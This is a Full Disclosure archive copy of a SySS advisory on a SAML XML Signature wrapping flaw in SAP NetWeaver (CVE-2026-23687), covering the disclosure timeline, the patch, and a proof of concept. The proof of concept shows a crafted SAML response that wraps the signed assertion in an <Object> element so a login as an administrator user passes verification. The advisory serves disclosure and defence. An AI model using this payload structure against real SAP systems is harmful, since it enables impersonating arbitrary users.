---
title: [SYSS-2026-004] SAP NetWeaver SAML XML Signature Wrapping
url: https://seclists.org/fulldisclosure/2026/Jun/1
source: Full Disclosure
date: 2026-06-09
fetch_date: 2026-06-10T06:17:14.905590
---

# [SYSS-2026-004] SAP NetWeaver SAML XML Signature Wrapping

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](0)
[By Date](date.html#1)
[![Next](/images/right-icon-16x16.png)](2)

[![Previous](/images/left-icon-16x16.png)](0)
[By Thread](index.html#1)
[![Next](/images/right-icon-16x16.png)](2)

![](/shared/images/nst-icons.svg#search)

# [SYSS-2026-004] SAP NetWeaver SAML XML Signature Wrapping

---

*From*: Moritz Bechler via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Mon, 8 Jun 2026 10:16:17 +0200

---

```
Advisory ID:               SYSS-2026-004
Product:                   SAP NetWeaver ABAP / SAP_BASIS
Manufacturer:              SAP SE
Affected Version(s):       SAP_BASIS 700 - 918
Tested Version(s):         7.93 Patch 300
Vulnerability Type:        CWE-347: Improper Verification of Cryptographic Signature
Risk Level:                High
Solution Status:           Fixed
Manufacturer Notification: 2025-11-06
Solution Date:             2026-02-10
Public Disclosure:         2026-06-08
CVE Reference:             CVE-2026-23687
Author of Advisory:        Moritz Bechler, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

SAP NetWeaver is the software stack powering SAP's business applications,
including S4/HANA.

The manufacturer describes the product as follows (see [1]):

"SAP NetWeaver provides an open integration and application platform and
facilitates the implementation of the Enterprise Services Architecture.
You can standardize business processes across technological boundaries,
integrate applications for your employees as required, and access and edit
simple information easily and in a structured manner.
[...]
SAP NetWeaver is the basis for SAP solutions."

SAML response validation in NetWeaver's SAML Service Provider is susceptible
to XML Signature wrapping attacks, specifically through Signature/Object tags.
This allows an attacker to manipulate SAML assertion data returned by the
identity provider, therefore enabling logging in as an arbitrary user.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

In SAML authentication responses, the SAML assertion/user identity attributes
are cryptographically signed by the identity provider using the XML Signature
(XMLDSig) standard. In web single sign-on contexts, the SAML response is
passed through the authenticating user's browser and therefore very susceptible
to modification.

When verifying a specially crafted SAML response, the SAMP service provider
implementation verifies the signature over one part of the XML document while
using information from another element to identify the authenticated user.

Providing original, legitimate information from any valid SAML response in
the first part and the corresponding signature, along with a manipulated
alternative part, authentication to the SAP system as an arbitrary
SAML-enabled / mapped user is possible.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

A typical (non-encrypted, assertion signing) SAML response will have a structure
like the following (various irrelevant elements are removed for brevity):

<samlp:Response>
<Assertion ID="MyID">
  <Signature>
    <SignedInfo>
      <Reference URI="#MyID">
         <DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"; />
         <DigestValue>[...]</DigestValue>
      </Reference>
    </SignedInfo>
    <SignatureValue>[...]</SignatureValue>
    <KeyInfo>
       <X509Data><X509Certificate>[...]</X509Certificate></X509Data>
    </KeyInfo>
  </Signature>
  <Subject><...></Subject>
  <AttributeStatement>
    <Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name";>
      <AttributeValue>originaluser@mydomain.example</AttributeValue>
    </Attribute>
    <...>
  </AttributeStatement>
</Assertion>
</samlp:Response>

The XML Signature specification is very flexible (read: complex), leaving
significant room for ambiguities and implementation errors. Apart from
referencing the data to be signed/verified through the <Reference> element,
the signed data can also be directly included in the <Signature> element
through an <Object> tag (see [4]).
Doing so is fully specified and conformant with the XML schema.

Transforming the SAML response to use the <Object> syntax yields the following:

<samlp:Response>
<Assertion ID="MyID">
  <Signature>
    <SignedInfo>
      <Reference URI="#MyID">
         <DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"; />
         <DigestValue>[...]</DigestValue>
      </Reference>
    </SignedInfo>
    <SignatureValue>[...]</SignatureValue>
    <KeyInfo>
       <X509Data><X509Certificate>[...]</X509Certificate></X509Data>
    </KeyInfo>
    <Object>
      <Assertion ID="MyID">
        <Subject><...></Subject>
        <AttributeStatement>
          <Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name";>
            <AttributeValue>originaluser@mydomain.example</AttributeValue>
          </Attribute>
          <...>
        </AttributeStatement>
      </Assertion>
    </Object>
  </Signature>
  <Subject><...></Subject>
  <AttributeStatement>
    <Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name";>
      <AttributeValue>myadmin@mydomain.example</AttributeValue>
    </Attribute>
    <...>
  </AttributeStatement>
</Assertion>
</samlp:Response>

This is a well-known and published attack vector against XML signatures.
A graphical representation of this transformation is given in [5], also
the Burp SAML Raider extension provides a convenient way to execute the
attack (XSW8).

As the signed elements have not changed, the XML Signature element is still
valid and can be verified. The XML Signature implementation used in NetWeaver
now calculates the hash value for verification of the signature over the
<Object> element's contents.

Now, the original copy of the data within the outer <Assertion> element
can be modified without invalidating the signature, and this is the
information extracted and used by NetWeaver to determine the identity of
the authenticated SAP user.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

Apply vendor patch: SAP note 3697567.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2025-10-23: Vulnerability discovered
2025-11-06: Vulnerability reported to vendor
2025-11-10: Vendor unable to reproduce the vulnerability, requesting
            additional diagnostics
2025-12-10: Reproduction with assistance of a generous customer
2025-12-12: Diagnostics provided to vendor
2025-12-18: Vendor responded to diagnostics with: "system reaction is as
            expected, no security issue"
2025-12-18: Disputed this assessment
2026-01-08: Requested status from vendor
2026-01-08: Vendor confirmed vulnerability
2026-02-10: Vendor released patch
2026-06-08: Public disclosure of vulnerability (delayed on vendor's request)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] SAP NetWeaver documentation
    https://help.sap.com/doc/saphelp_em900/9.0/en-US/ca/6fbd35746dbd2de10000009b38f889/frameset.htm
[2] SySS Security Advisory SYSS-2026-004
    https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2026-004.txt
[3] SySS Responsible Disclosure Policy
    https://www.syss.de/en/responsible-disclosure-policy
[4] XML Signature Syntax and Processing Version 1.1
    https://www.w3.org/TR/xmldsig...